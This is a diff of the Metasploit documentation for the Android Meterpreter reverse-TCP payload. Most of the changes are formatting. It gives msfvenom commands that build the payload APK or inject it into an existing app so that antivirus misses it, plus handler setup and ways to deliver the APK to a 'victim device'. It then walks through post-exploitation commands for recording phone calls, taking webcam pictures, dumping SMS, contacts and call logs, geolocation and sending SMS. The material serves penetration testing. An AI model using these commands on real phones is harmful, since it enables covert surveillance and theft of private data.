@@ -1,12 +1,12 @@
+## Vulnerable Application
 The android/meterpreter/reverse_tcp payload is a Java-based Meterpreter that can be used on an
 Android device. It is still at an early stage of development, but there are so many things you can
 do with it already.
 
-The Android Meterpreter allows you to do things like take remote control the file system, listen to phone calls, retrieve or send SMS messages, geo-locate the user, run post-exploitation modules, etc.
+Android Meterpreter allows you to do things like take remote control the file system,
+listen to phone calls, retrieve or send SMS messages, geo-locate the user, run post-exploitation modules, etc.
 
-## Vulnerable Application
-
-You can test android/meterpreter/reverse_tcp on these devices:
+You can test `android/meterpreter/reverse_tcp` on these devices:
 
 **Android Emulator**
 
@@ -14,8 +14,9 @@ An emulator is the most convenient way to test Android Meterpreter. You can try:
 
 * [Android SDK](http://developer.android.com/sdk/index.html#Other) - Creates and manages your emulators from a command prompt or terminal.
 * [Android Studio](http://developer.android.com/sdk/installing/index.html?pkg=studio) - Allows you to manage emulators more easily than the SDK.
-* [GenyMotion](https://www.genymotion.com/download/) - Requires an account. 
+* [GenyMotion](https://www.genymotion.com/download/) - Requires an account.
 * [AndroidAVDRepo](https://github.com/dral3x/AndroidAVDRepo) - Contains a collection of pre-configured emulators.
+* [Bluestacks](https://www.bluestacks.com/)  - Very easy to install Android Emulator on Windows.
 
 
 **A real Android device**
@@ -24,13 +25,13 @@ Having a real Android device allows you to test features or vulnerabilities you 
 have from an emulator, which might be specific to a manufacturer, carrier, or hardware. You also
 get to test it over a real network.
 
-
 ## Verification Steps
 
+### To create the APK with msfconsole
 Currently, the most common way to use Android Meterpreter is to create it as an APK, and then
-execute it.
+execute it on a victim device.
 
-To create the APK with msfconsole:
+To create the APK with `msfconsole`:
 
 ```
 msf > use payload/android/meterpreter/reverse_tcp 
@@ -47,14 +48,14 @@ msf payload(reverse_tcp) >
 ./msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
 ```
 
-### To inject meterpreter into an existing APK with msfvenom:
+### To inject Meterpreter into an existing APK with msfvenom:
 
-You can also add Android meterpreter to any existing APK. This will make it harder for
+You can also add Android Meterpreter to any existing APK. This will make it harder for
 Anti-virus software to detect the payload, and allow you read internal files and take
 screenshots of the Android app that you are backdooring:
 
 ```
-./msfvenom -p android/meterpreter/reverse_tcp -x com.existing.apk LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
+./msfvenom -p android/meterpreter/reverse_tcp -x <PATH TO EXISTING APK FILE> LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
 ```
 
 [Please see here for more documentation on Android injection](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/android/meterpreter/injection.md).
@@ -67,7 +68,7 @@ so please refer to the Scenarios section for more information.
 
 **pwd**
 
-The ```pwd``` command allows you to see the current directory you're in.
+The `pwd` command allows you to see the current directory you're in.
 
 ```
 meterpreter > pwd
@@ -76,7 +77,7 @@ meterpreter > pwd
 
 **cd**
 
-The ```cd``` command allows you to change directory. For example:
+The `cd` command allows you to change directory. For example:
 
 ```
 meterpreter > cd cache
@@ -85,11 +86,11 @@ meterpreter > ls
 
 **cat**
 
-The ```cat``` command allows you to see the contents of a file.
+The `cat` command allows you to see the contents of a file.
 
 **ls**
 
-The ```ls``` command displays items in a directory. For example:
+The `ls` command displays items in a directory. For example:
 
 ```
 meterpreter > ls
@@ -103,17 +104,17 @@ Mode              Size  Type  Last modified              Name
 
 **upload**
 
-The ```upload``` command allows you to upload a file to the remote target. The ```-r``` option
+The `upload` command allows you to upload a file to the remote target. The `-r` option
 allows you to do so recursively.
 
 **download**
 
-The ```download``` command allows you to download a file from the remote target. The ```-r```
+The `download` command allows you to download a file from the remote target. The `-r`
 option allows you to do so recursively.
 
 **search**
 
-The ```search``` command allows you to find files on the remote target. For example:
+The `search` command allows you to find files on the remote target. For example:
 
 ```
 meterpreter > search -d . -f *.txt
@@ -121,7 +122,7 @@ meterpreter > search -d . -f *.txt
 
 **ifconfig**
 
-The ```ifconfig``` command displays the network interfaces on the remote machine.
+The `ifconfig` command displays the network interfaces on the remote machine.
 
 ```
 meterpreter > ifconfig
@@ -146,7 +147,7 @@ IPv6 Netmask : ::
 
 **getuid**
 
-The ```getuid``` command shows the current user that the payload is running as:
+The `getuid` command shows the current user that the payload is running as:
 
 ```
 meterpreter > getuid
@@ -155,7 +156,7 @@ Server username: u0_a231
 
 **ps**
 
-The ```ps``` command shows a list of processes the Android device is running. For example:
+The `ps` command shows a list of processes the Android device is running. For example:
 
 ```
 meterpreter > ps 
@@ -187,7 +188,7 @@ Process List
 
 **shell**
 
-The ```shell``` command allows you to interact with a shell:
+The `shell` command allows you to interact with a shell:
 
 ```
 meterpreter > shell
@@ -201,7 +202,7 @@ To get back to the Meterpreter prompt, you can do: [CTRL]+[Z]
 
 **sysinfo**
 
-The ```sysinfo``` command shows you basic information about the Android device.
+The `sysinfo` command shows you basic information about the Android device.
 
 ```
 meterpreter > sysinfo
@@ -212,7 +213,7 @@ Meterpreter : java/android
 
 **webcam_list**
 
-The ```webcam_list``` command shows a list of webcams you could use for the ```webcam_snap```
+The `webcam_list` command shows a list of webcams you could use for the `webcam_snap`
 command. Example:
 
 ```
@@ -223,8 +224,8 @@ meterpreter > webcam_list
 
 **webcam_snap**
 
-The ```webcam_snap``` command takes a picture from the device. You will have to use the
-```webcam_list``` command to figure out which camera to use. Example:
+The `webcam_snap` command takes a picture from the device. You will have to use the
+`webcam_list` command to figure out which camera to use. Example:
 
 ```
 meterpreter > webcam_snap -i 2
@@ -236,7 +237,7 @@ Webcam shot saved to: /Users/user/rapid7/msf/uFWJXeQt.jpeg
 
 **record_mic**
 
-The ```record_mic``` command records audio. Good for listening to a phone conversation, as well as
+The `record_mic` command records audio. Good for listening to a phone conversation, as well as
 other uses. Example:
 
 ```
@@ -248,12 +249,12 @@ Audio saved to: /Users/user/rapid7/msf/YAUtubCR.wav
 
 **activity_start**
 
-The ```activity_start``` command is an execute command by starting an Android activity from a URI
+The `activity_start` command is an execute command by starting an Android activity from a URI
 string.
 
 **check_root**
 
-The ```check_root``` command detects whether your payload is running as root or not. Example:
+The `check_root` command detects whether your payload is running as root or not. Example:
 
 ```
 meterpreter > check_root
@@ -262,7 +263,7 @@ meterpreter > check_root
 
 **dump_calllog**
 
-The ```dump_calllog``` command retrieves the call log from the Android device.
+The `dump_calllog` command retrieves the call log from the Android device.
 
 **dump_contacts**
 
@@ -274,12 +275,12 @@ meterpreter > dump_contacts
 
 **geolocate**
 
-The ```geolocate``` commands allows you to locate the phone by retrieving the current lat-long
+The `geolocate` commands allows you to locate the phone by retrieving the current lat-long
 using geolocation.
 
 **wlan_geolocate**
 
-The ```wlan_geolocation``` command allows you to locate the phone by retrieving the current
+The `wlan_geolocation` command allows you to locate the phone by retrieving the current
 lat-long using WLAN information. Example:
 
 ```
@@ -290,7 +291,7 @@ meterpreter > wlan_geolocate
 
 **send_sms**
 
-The ```send_sms``` command allows you to send an SMS message. Keep in mind the phone will keep a
+The `send_sms` command allows you to send an SMS message. Keep in mind the phone will keep a
 copy of it, too.
 
 ```
@@ -300,7 +301,7 @@ meterpreter > send_sms -d "2674554859" -t "hello"
 
 **sms_dump**
 
-The ```sms_dump``` command allows you to retrieve SMS messages. And save them as a text file.
+The `sms_dump` command allows you to retrieve SMS messages. And save them as a text file.
 For example:
 
 ```
@@ -334,7 +335,7 @@ Message	: Hello world
 
 **run**
 
-The ```run``` command allows you to run a post module against the remote machine at the Meterpreter
+The `run` command allows you to run a post module against the remote machine at the Meterpreter
 prompt. For example:
 
 ```
@@ -346,20 +347,21 @@ meterpreter > run post/android/capture/screen
 **Uploading APK to an Emulator using install_msf_apk.sh**
 
 The Metasploit Framework comes with a script that allows you to automatically upload your APK to
-an active emulator and execute it. It requires the [Android SDK platform-tools](http://developer.android.com/sdk/installing/index.html) to run, as well as [Java](https://java.com/en/download/).
+an active emulator and execute it. It requires the [Android SDK platform-tools](http://developer.android.com/sdk/installing/index.html)
+to run, as well as [Java](https://java.com/en/download/).
 
 To use this, follow these steps:
 
 1. Start the Android Emulator
 2. Generate the Android payload as an APK.
-3. In msfconsole, start a handler for android/meterpreter/reverse_tcp
+3. In `msfconsole`, start a handler for `android/meterpreter/reverse_tcp`
 4. Run the installer script like this from a terminal:
 
 ```
 $ tools/exploit/install_msf_apk.sh /tmp/android.apk
 ```
 
-The the script will do something like this:
+The script will do something like this:
 
 ```
 $ tools/exploit/install_msf_apk.sh /tmp/android.apk 
@@ -376,7 +378,7 @@ rm failed for -f, Read-only file system
 Starting: Intent { act=android.intent.action.MAIN cmp=com.metasploit.stage/.MainActivity }
 ```
 
-Back in msfconsole, you should receive a session:
+Back in `msfconsole`, you should receive a session:
 
 ```
 [*] Started reverse TCP handler on 192.168.1.199:4444 
@@ -399,9 +401,9 @@ Under Developer Options, make sure to:
 
 * Enable USB debugging
 * Disable Verify apps via USB
-* Open a terminal, and type: ```adb devices```. On your Android device, you should see a prompt
+* Open a terminal, and type: `adb devices`. On your Android device, you should see a prompt
   asking you to allow the computer for debugging, click OK on that.
-* Do: ```adb devices``` again, adb should now have access.
+* Do: `adb devices` again, adb should now have access.
 
 Run the installer script like this from a terminal:
 
@@ -410,8 +412,6 @@ $ tools/exploit/install_msf_apk.sh /tmp/android.apk
 ```
 
 And you should get a session.
-
-
 
 **Uploading APK from a Web Server**
 
@@ -422,7 +422,7 @@ it's something like this: Settings -> Security -> Check "Unknown Sources"
 Once you have that changed, you'll need to:
 
 1. Generate the APK payload.
-2. Start a web server from the directory where the payload is: ```ruby -run -e httpd . -p 8181```
+2. Start a web server from the directory where the payload is: `ruby -run -e httpd . -p 8181`
 3. On your Android device, open a browser, and download the APK.
 4. You should be able to find the APK from the Downloads folder, install it.
 5. After installation, you will have to manually execute it.
@@ -434,10 +434,10 @@ launch an intent from a browser. An intent is simply a term in Android developme
 
 Here's how you do this:
 
-1. In msfconsole, start a multi/handler for android/meterpreter/reverse_tcp as a background job.
-2. Do: ```auxiliary/server/android_browsable_msf_launch```.
-3. Set the URIPATh if needed.
-4. Do: ```run```. At this point, the web server should be up.
+1. In `msfconsole`, start a `multi/handler` for `android/meterpreter/reverse_tcp` as a background job.
+2. Do: `auxiliary/server/android_browsable_msf_launch`.
+3. Set the URIPATH if needed.
+4. Do: `run`. At this point, the web server should be up.
 5. On your Android device, open the native web browser, and go the URL generated by the auxiliary
    module.
 6. The Android handler should get a session like the following demo:
